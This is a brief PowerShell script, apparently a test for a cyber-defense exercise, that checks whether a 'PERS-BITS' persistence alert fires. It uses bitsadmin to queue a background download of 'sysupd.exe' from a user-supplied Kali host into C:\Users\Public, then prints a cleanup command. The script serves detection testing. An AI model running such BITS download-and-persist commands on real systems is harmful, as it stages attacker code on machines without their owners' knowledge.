param([Parameter(Mandatory=$true)][string]$Kali, [int]$Port = 8000)
Write-Host "[1] creating BITS job with a queued transfer (expect PERS-BITS within 30s)..."
bitsadmin /create CCDCTestJob2 | Out-Null
bitsadmin /addfile CCDCTestJob2 "http://${Kali}:${Port}/sysupd.exe" C:\Users\Public\sysupd_bits.exe | Out-Null
bitsadmin /resume CCDCTestJob2 2>$null | Out-Null
Write-Host "job queued (target unreachable is fine - queued is what persists)"
Write-Host "cleanup: bitsadmin /cancel CCDCTestJob2"
